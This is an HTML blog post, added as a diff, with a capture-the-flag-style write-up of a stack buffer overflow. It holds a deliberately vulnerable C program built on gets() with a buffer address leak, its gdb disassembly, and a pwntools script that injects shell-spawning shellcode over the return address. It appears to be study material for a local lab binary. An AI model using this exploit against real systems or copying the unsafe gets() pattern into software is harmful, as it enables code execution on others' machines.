@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>bof · Gahyun Baek</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=DM+Serif+Display:ital@0;1&family=DM+Mono:wght@300;400&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/style.css">
+  <style>
+    .post-header { margin-bottom: 2.5rem; }
+    .post-header h1 {
+      font-family: 'DM Serif Display', serif;
+      font-size: 2rem; font-weight: 400; line-height: 1.2; margin-bottom: .6rem;
+    }
+    .post-meta { display: flex; gap: .8rem; align-items: center; font-size: .78rem; color: var(--muted); }
+    .post-tag { background: var(--tag); border-radius: 4px; padding: .1rem .5rem; font-size: .72rem; color: var(--muted); }
+    .post-body { line-height: 1.85; font-size: .95rem; }
+    .post-body h2 { font-family: 'DM Serif Display', serif; font-size: 1.4rem; font-weight: 400; margin: 2.2rem 0 .8rem; }
+    .post-body h3 { font-size: 1rem; font-weight: 600; margin: 1.8rem 0 .5rem; }
+    .post-body h4 { font-size: .9rem; font-weight: 600; margin: 1.2rem 0 .4rem; color: var(--muted); }
+    .post-body p  { margin-bottom: 1rem; }
+    .post-body ul, .post-body ol { margin: .5rem 0 1rem 1.5rem; }
+    .post-body li { margin-bottom: .35rem; }
+    .post-body blockquote {
+      border-left: 3px solid var(--accent); margin: 1.2rem 0;
+      padding: .6rem 1rem; background: var(--tag); border-radius: 0 6px 6px 0;
+    }
+    .post-body blockquote p { margin: 0; color: var(--muted); font-style: italic; }
+    .post-body hr { border: none; border-top: 1px solid var(--line); margin: 2rem 0; }
+    .post-body pre {
+      background: #1a1814; color: #f7f5f0; border-radius: 6px;
+      padding: 1.2rem; overflow-x: auto; font-size: .82rem; margin: 1.2rem 0;
+    }
+    .post-body code { font-family: 'DM Mono', monospace; }
+    .post-body p code { background: var(--tag); border-radius: 3px; padding: .1rem .35rem; font-size: .85em; }
+    .post-body a { color: var(--accent); text-decoration: none; }
+    .post-body a:hover { text-decoration: underline; }
+    .back-link {
+      display: inline-flex; align-items: center; gap: .4rem;
+      font-size: .8rem; color: var(--muted); text-decoration: none;
+      margin-bottom: 2rem; transition: color .2s;
+    }
+    .back-link:hover { color: var(--ink); }
+    hr.post-divider { border: none; border-top: 1px solid var(--line); margin: 2rem 0; }
+</style>
+</head>
+<body>
+<nav>
+  <a class="nav-logo" href="../../index.html">Gahyun Baek</a>
+  <ul class="nav-links">
+    <li><a href="../../index.html">Home</a></li>
+    <li><a href="../../pages/papers.html">Papers</a></li>
+    <li><a href="../../pages/posts.html" class="active">Posts</a></li>
+    <li><a href="../../pages/blog.html">Blog</a></li>
+    <li><a href="../../pages/cv.html">CV</a></li>
+  </ul>
+</nav>
+<main class="page">
+  <a class="back-link" href="../posts.html">← Back to Posts</a>
+  <div class="post-header">
+    <h1>bof</h1>
+    <div class="post-meta">
+      <span>2026·05</span>
+      <span class="post-tag">Note</span>
+    </div>
+  </div>
+  <hr class="post-divider">
+  <div class="post-body">
+<h2>문제</h2>
+
+<pre><code class="language-c">
+┌──(venv)(hyeoni㉿SecAI)-[~/Documents/Dreamhack/0506/1.code_injection]
+└─$ cat stack.c
+#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+#ifndef BUF_SIZE
+#define BUF_SIZE 100
+#endif
+
+int bof()
+{
+    char buffer[BUF_SIZE];
+
+    /* Leak: print the runtime address of buffer[] */
+    printf("Address of buffer[] inside bof():  0x%.8x\n", (unsigned)buffer);
+
+    gets(buffer);
+
+    return 1;
+}
+
+int main(int argc, char **argv)
+{
+    bof();
+
+    printf("Return successfully without any problem :(\n");
+    return 1;
+}
+</code></pre>
+
+<h2>해결</h2>
+
+<pre><code class="language-c">
+gdb-peda$ disassemble bof
+Dump of assembler code for function bof:
+   0x080491d6 &lt;+0&gt;:     endbr32
+   0x080491da &lt;+4&gt;:     push   ebp
+   0x080491db &lt;+5&gt;:     mov    ebp,esp
+   0x080491dd &lt;+7&gt;:     push   ebx
+   0x080491de &lt;+8&gt;:     sub    esp,0x74
+   0x080491e1 &lt;+11&gt;:    call   0x8049110 &lt;__x86.get_pc_thunk.bx&gt;
+   0x080491e6 &lt;+16&gt;:    add    ebx,0x2e1a
+   0x080491ec &lt;+22&gt;:    lea    eax,[ebp-0x6c]
+   0x080491ef &lt;+25&gt;:    sub    esp,0x8
+   0x080491f2 &lt;+28&gt;:    push   eax
+   0x080491f3 &lt;+29&gt;:    lea    eax,[ebx-0x1ff8]
+   0x080491f9 &lt;+35&gt;:    push   eax
+   0x080491fa &lt;+36&gt;:    call   0x8049080 &lt;printf@plt&gt;
+   0x080491ff &lt;+41&gt;:    add    esp,0x10
+   0x08049202 &lt;+44&gt;:    sub    esp,0xc
+   0x08049205 &lt;+47&gt;:    lea    eax,[ebp-0x6c]
+   0x08049208 &lt;+50&gt;:    push   eax
+   0x08049209 &lt;+51&gt;:    call   0x8049090 &lt;gets@plt&gt;
+   0x0804920e &lt;+56&gt;:    add    esp,0x10
+   0x08049211 &lt;+59&gt;:    mov    eax,0x1
+   0x08049216 &lt;+64&gt;:    mov    ebx,DWORD PTR [ebp-0x4]
+   0x08049219 &lt;+67&gt;:    leave
+   0x0804921a &lt;+68&gt;:    ret
+</code></pre>
+
+<p>0x6c = 108</p>
+
+<pre><code class="language-c">
+$ cat ex.py
+from pwn import *
+
+context.arch = 'i386'
+
+p = process("./stack")
+
+p.recvuntil(b"Address of buffer[] inside bof(): ")
+leaked_address = p.recvline().decode('utf-8').strip()
+bof_address = int(leaked_address, 16)
+print(f"{hex(bof_address)}")
+
+shellcode = asm(shellcraft.sh())
+
+payload = shellcode
+payload += b"a"*(112 - len(shellcode))
+payload += p32(bof_address)
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+  </div>
+</main>
+<script src="../../js/nav.js"></script>
+</body>
+</html>
